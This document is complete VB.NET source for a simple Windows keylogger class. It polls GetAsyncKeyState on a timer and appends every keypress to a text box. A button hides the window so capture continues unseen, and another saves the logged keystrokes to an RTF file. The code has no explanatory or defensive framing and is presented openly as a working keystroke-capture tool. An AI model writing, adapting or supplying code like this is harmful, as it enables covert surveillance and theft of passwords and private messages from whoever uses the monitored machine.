Public Class KeyLogger
    Dim result As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                RichTextBox1.Text = RichTextBox1.Text + Chr(i)
            End If
        Next i
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Me.Hide()
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Try
            Dim dlg As SaveFileDialog = New SaveFileDialog
            dlg.Title = "Save"
            dlg.Filter = "Rich Text Files (*.rtf)|*.rtf"
            If dlg.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
                RichTextBox1.SaveFile(dlg.FileName, RichTextBoxStreamType.RichText)
            End If
        Catch ex As Exception : End Try
    End Sub
End Class